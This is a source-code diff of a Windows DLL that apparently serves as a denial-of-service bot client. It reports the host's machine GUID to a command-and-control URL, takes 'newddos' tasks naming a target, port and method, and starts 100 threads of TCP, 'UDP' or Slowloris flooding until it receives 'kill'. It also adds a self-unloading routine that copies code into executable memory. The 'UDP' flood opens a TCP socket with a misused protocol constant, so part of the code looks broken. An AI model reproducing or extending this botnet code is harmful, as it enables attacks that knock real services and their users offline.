@@ -9,11 +9,9 @@
 #include <vector>
 #include <sstream>
 #include <utility>
-
-/*
-Nice Example but not working
-*/
-
+#include <WinSock2.h>
+#pragma comment(lib,"ws2_32.lib")
+#define MAX_PACKET_SIZE 4096
 
 extern "C"
 {
@@ -21,7 +19,7 @@ extern "C"
 	bool task1_running = false;
 	bool stopTask = false;
 	std::string globalTaskIDRunning = "0";
-
+	std::string maxtime;
 	void split(const std::string& str, const std::string& delimiter, std::vector<std::string>& arr) {
 				
 		int strleng = str.length();
@@ -51,6 +49,8 @@ extern "C"
 
 
 
+
+
 	static std::string GetMachineGUID()
 	{
 		std::string ret;
@@ -66,240 +66,284 @@ extern "C"
 		::RegCloseKey(key);
 		return ret;
 	}
-			
-	void slowloris(std::string method,std::string targetip, std::string port, std::string maxtime) {
-		while (true)
+
+
+	DWORD WINAPI TCPThread(PVOID p)
+	{
+		SOCKET s;
+		sockaddr_in* sai;
+		char packet[2048];
+		int n;
+		memset(packet, 0, 2048);
+		sai = (sockaddr_in*)p;
+		while (1)
 		{
-			if (stopTask) {
-				break;
-			}
+			s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
+			if (s != INVALID_SOCKET)
+			{
+				connect(s, (sockaddr*)sai, sizeof(sockaddr_in));
+				send(s, packet, sizeof(packet) - 1, 0);
 
-			//std::cout << "Running \n";
-			task1_running = true;
+				while (1)
+				{
+					n = send(s, packet, 1, 0);
 
-			std::string param = random_string(20)+"="+ RND_CHAR + "&"+ random_string(20) +"="+ RND_CHAR + "&" + random_string(20) + "=" + RND_CHAR + "&" + random_string(20) + "=" +RND_CHAR;
-			//std::string param = "";
-			char* host;
-			char* path;
-			HTTPURL u(targetip);
-			int min = 1;
-			int max = 4;
-
-			host = (char*)u.domain.c_str();
-			path = (char*)u.path.c_str();
-
-			TCHAR hdrs[] = TEXT("Connection: Keep-Alive\r\nCache-Control: no-cache\r\nOrigin: http://google.com\r\n");
-			LPVOID frmdata = (LPVOID)param.c_str();
-			LPCSTR accept[2] = { "text/plain" };
-
-			std::vector<std::string> v = {
-				"Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)",
-				"Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)",
-				"Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
-				"Mozilla/4.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.33 Safari/532.0",
-				"Mozilla/4.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.59 Safari/525.19",
-				"Mozilla/4.0 (compatible; MSIE 6.0; Linux i686 ; en) Opera 9.70",
-				"Mozilla/4.0 (compatible; MSIE 6.0; Mac_PowerPC; en) Opera 9.24",
-				"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; YPC 3.2.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)",
-				"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 9.22",
-				"Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10",
-				"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3)",
-				"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.0.3705; Media Center PC 3.1; Alexa Toolbar; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
-				"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)",
-				"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; OfficeLiveConnector.1.4; OfficeLivePatch.1.3; yie8)",
-				"Opera/9.10 (Windows NT 5.1; U; it)",
-				"Opera / 9.10 (X11; Linux i686; U; en)",
-				"Opera/9.80 (X11; Linux i686; U; Debian; pl) Presto/2.2.15 Version/10.00",
-		        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
-				"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
-				"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
-				"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
-				"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
-				"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
-				"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1",
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
-				"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
-				"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
-				"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
-				"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1",
-				"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
-				"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
-				"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
-				"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
-				"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",
-				"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)",
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
-				"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
-				"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
-				"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
-				"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
-				"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
-				"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
-				"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
-				"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
-				"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)",
-				"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)",
-				"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
-				"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
-				"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
-				"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre",
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
-				"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0",
-				"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
-				"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0",
-				"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)",
-				"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1",
-				"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
-				"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
-				"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1",
-				"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1"
-			};
-
-			std::random_device random_device;
-			std::mt19937 engine{ random_device() };
-			std::uniform_int_distribution<int> dist(0, v.size() - 1);
-
-
-			int time = 60;
-			for (int i = 0; i < time * 20; i++) {
-				HINTERNET hSession;
-				HINTERNET hConnect;
-				HINTERNET hRequest;
-				std::string random_element = v[dist(engine)];
-				//std::cout << random_element;
-
-				std::random_device rd;
-				std::mt19937 mt(rd());
-				std::uniform_int_distribution<int> dist(1, 2);
-				std::string method = "POST";
-				if (dist(mt) == 1) {
-					std::string method = "GET";
+					if (n == SOCKET_ERROR)
+					{
+						break;
+					}
+					Sleep(100);
 				}
 
-				hSession = InternetOpen(random_element.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-				hConnect = InternetConnect(hSession, host, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
-				hRequest = HttpOpenRequest(hConnect, method.c_str(), path, NULL, NULL, accept, INTERNET_FLAG_RESYNCHRONIZE | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_RELOAD, 1);
-
-				if (!HttpSendRequest(hRequest,
-					hdrs,
-					strlen(hdrs),
-					frmdata,
-					strlen(param.c_str()))) {
-					DWORD errorCode = GetLastError();
-					//std::cout << errorCode;
-				}
-				//HttpSendRequest(hRequest, hdrs, strlen(hdrs), frmdata, strlen(param.c_str()));
-				DWORD rSize;
-				char tmp[1024 + 1];
-				string szBuffer;
-
-				while (InternetReadFile(hRequest, tmp, 1024, &rSize) && rSize > 0) {}
-
-				InternetCloseHandle(hSession);
-				InternetCloseHandle(hConnect);
-				InternetCloseHandle(hRequest);
+				closesocket(s);
 			}
 		}
 	}
 
-	void tcp(std::string method, std::string targetip, std::string port, std::string maxtime) {
 
-		int seconds = std::stoi(maxtime);
-		int timespersecond = 500;
-		TCPFlood((char*)"10.0.0.9", htons(stoi(port)), seconds, timespersecond);
-			
+	DWORD WINAPI UDPThread(PVOID p)
+	{
+		SOCKET s;
+		sockaddr_in* sai;
+		char packet[2048];
+		int n;
+		memset(packet, 0, 2048);
+		sai = (sockaddr_in*)p;
+		while (1)
+		{
+			s = socket(AF_INET, SOCK_STREAM, IPPORT_BIFFUDP);
+
+			if (s != INVALID_SOCKET)
+			{
+				connect(s, (sockaddr*)sai, sizeof(sockaddr_in));
+				send(s, packet, sizeof(packet) - 1, 0);
+
+				while (1)
+				{
+					n = send(s, packet, 1, 0);
+
+					if (n == SOCKET_ERROR)
+					{
+						break;
+					}
+					Sleep(100);
+				}
+
+				closesocket(s);
+			}
+		}
 	}
 
-	void udp(std::string method, std::string targetip, std::string port, std::string maxtime) {
+	DWORD WINAPI SlowlorisThread(PVOID p)
+	{
+		SOCKET s;
+		sockaddr_in* sai;
 
-		int seconds = std::stoi(maxtime);
-		int timespersecond = 500;
-					
+		char header[] = "GET /", a = 'A';
+		int n;
 
-		TCPFlood((char*)targetip.c_str(), htons(stoi(port)),seconds,timespersecond);
+		sai = (sockaddr_in*)p;
+		while (1)
+		{
+			s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+			if (s != INVALID_SOCKET)
+			{
+				connect(s, (sockaddr*)sai, sizeof(sockaddr_in));
+				send(s, header, sizeof(header) - 1, 0);
+
+				while (1)
+				{
+					n = send(s, &a, 1, 0);
+
+					if (n == SOCKET_ERROR)
+					{
+						break;
+					}
+					Sleep(100);
+				}
+
+				closesocket(s);
+			}
+		}
 	}
-	
-
+		
 	__declspec(dllexport) void BackConnect(std::string url)
 	{
+		int n = 20;
 		std::thread hThread;
+		std::vector<HANDLE> threads(100);
+
+
 
 		while (true) {
 			//std::cout << "Waiting \n";
-			int n = 20;
-			std::vector<thread> threads(n);
-			std::string post = "hwid=" + GetMachineGUID() + "&taskrunning=" + std::to_string(task1_running)+"&taskid="+ globalTaskIDRunning;
+
+			std::string post = "hwid=" + GetMachineGUID() + "&taskrunning=" + std::to_string(task1_running) + "&taskid=" + globalTaskIDRunning;
 
 			//std::cout << url;
 			std::string response = postRequest(url, post);
-				
 
-			
-		
-			if(response.find("newddos") != std::string::npos) {
+
+
+
+			if (response.find("newddos") != std::string::npos) {
 				std::vector<std::string> v;
-			
-				split(response,";",v);
-						
+
+				split(response, ";", v);
+
 				std::string taskid = v[1];
 				std::string method = v[2];
 				std::string targetip = v[3];
 				std::string port = v[4];
-				std::string maxtime = v[5];
+				maxtime = v[5];
 
 				//std::istringstream iss
 				globalTaskIDRunning = taskid;
-			
-
-					
 
 				if (!task1_running) {
 					stopTask = false;
-				
-					if (method == "tcp") {
-						hThread = thread(tcp, method, targetip, port, maxtime);
+					std::cout << "New Task \n";
+
+					ULONG i;
+					hostent* host;
+					sockaddr_in sai;
+					task1_running = true;
+
+					WSADATA wd;
+					if (WSAStartup(0x202, &wd))
+					{
+						printf("\nError: Unable to initialize Winsock\n");
+
 					}
-					if (method == "udp") {
-						hThread = thread(udp, method, targetip, port, maxtime);
+
+
+					char* hostHelper;
+					char* pathHelper;
+					HTTPURL u(targetip);
+
+					hostHelper = (char*)u.domain.c_str();
+					pathHelper = (char*)u.path.c_str();
+					host = gethostbyname(hostHelper);
+					if (!host)
+					{
+						return;
 					}
-					if (method == "slow") {
-						hThread = thread(slowloris, method, targetip, port, maxtime);
+
+					sai.sin_family = AF_INET;
+					sai.sin_addr.S_un.S_addr = *(PULONG)host->h_addr;
+					sai.sin_port = htons(strtoul(port.c_str(), NULL, 0));
+
+					//printf("\nCreating 1000 threads for attack...\n");
+
+					for (i = 0; i < 100; i++)
+					{
+						if (method == "slow") {
+							threads[i] = CreateThread(NULL, 0, SlowlorisThread, &sai, 0, NULL);
+						}
+						else if (method == "tcp") {
+							threads[i] = CreateThread(NULL, 0, TCPThread, &sai, 0, NULL);
+						}
+						else if (method == "udp") {
+							threads[i] = CreateThread(NULL, 0, UDPThread, &sai, 0, NULL);
+						}
 					}
+
 				}
-			}else if (response == "kill") {
-			
+			}
+			else if (response == "kill") {
 				globalTaskIDRunning = "0";
 				task1_running = false;
 				stopTask = true;
-				/*
+				
 				for (auto& th : threads) {
-					th.detach();
+					TerminateThread(th, 0);
+					CloseHandle(th);
 				}
-				*/
-
-				//hThread.detach();
-				//hThread.~thread();
-					
-				hThread.detach();
-				//hThread.native_handle().detach();
-				CloseHandle(hThread.native_handle());
+				
+				std::cout << "Kill Threads \n";
+				break;
+				return;
 			}
-			
 
-			Sleep(1000);
+
+			Sleep(2500);
 		}
-
+		return;
 	}
 
+}
 
 
-		
+typedef BOOL(WINAPI* PFreeLibrary)(_In_ HMODULE hModule);
+typedef VOID(WINAPI* PExitThread)(_In_ DWORD dwExitCode);
+typedef unsigned int (WINAPI* PTHREADPROC)(LPVOID lParam);
 
-	
+typedef struct _DLLUNLOADINFO
+{
+	PFreeLibrary	m_fpFreeLibrary;
+	PExitThread		m_fpExitThread;
+	HMODULE		    m_hFreeModule;
+}DLLUNLOADINFO, * PDLLUNLOADINFO;
+
+unsigned int WINAPI DllUnloadThreadProc(LPVOID lParam)
+{
+	PDLLUNLOADINFO pDllUnloadInfo = (PDLLUNLOADINFO)lParam;
+
+	//  
+	// FreeLibrary dll  
+	//  
+	(pDllUnloadInfo->m_fpFreeLibrary)(pDllUnloadInfo->m_hFreeModule);
+
+	//
+	// Exit Thread
+	// This thread return value is freed memory.
+	// So you don't have to return this thread.
+	//
+	pDllUnloadInfo->m_fpExitThread(0);
+	return 0;
+}
+
+
+VOID DllSelfUnloading(_In_ const HMODULE hModule)
+{
+	PVOID pMemory = NULL;
+	ULONG ulFuncSize;
+	unsigned int uintThreadId = 0;
+
+	pMemory = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	if (pMemory != NULL)
+	{
+		ulFuncSize = (ULONG_PTR)DllUnloadThreadProc - (ULONG_PTR)DllSelfUnloading;
+		if ((ulFuncSize >> 31) & 0x01)
+		{
+			ulFuncSize = (ULONG_PTR)DllSelfUnloading - (ULONG_PTR)DllUnloadThreadProc;
+		}
+
+		memcpy(pMemory, DllUnloadThreadProc, ulFuncSize);
+
+		((PDLLUNLOADINFO)(((ULONG_PTR)pMemory) + 0x500))->m_fpFreeLibrary =
+			(PFreeLibrary)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "FreeLibrary");
+
+		((PDLLUNLOADINFO)(((ULONG_PTR)pMemory) + 0x500))->m_fpExitThread =
+			(PExitThread)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "ExitThread");
+
+		((PDLLUNLOADINFO)(((ULONG_PTR)pMemory) + 0x500))->m_hFreeModule = hModule;
+
+		_beginthreadex(NULL, 0, (PTHREADPROC)pMemory, (PVOID)(((ULONG_PTR)pMemory) + 0x500), 0, &uintThreadId);
+	}
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		// Create your thread here to unload your dlls
+		DllSelfUnloading((HMODULE)hModule);
+	default:
+		break;
+	}
+	return TRUE;
 }
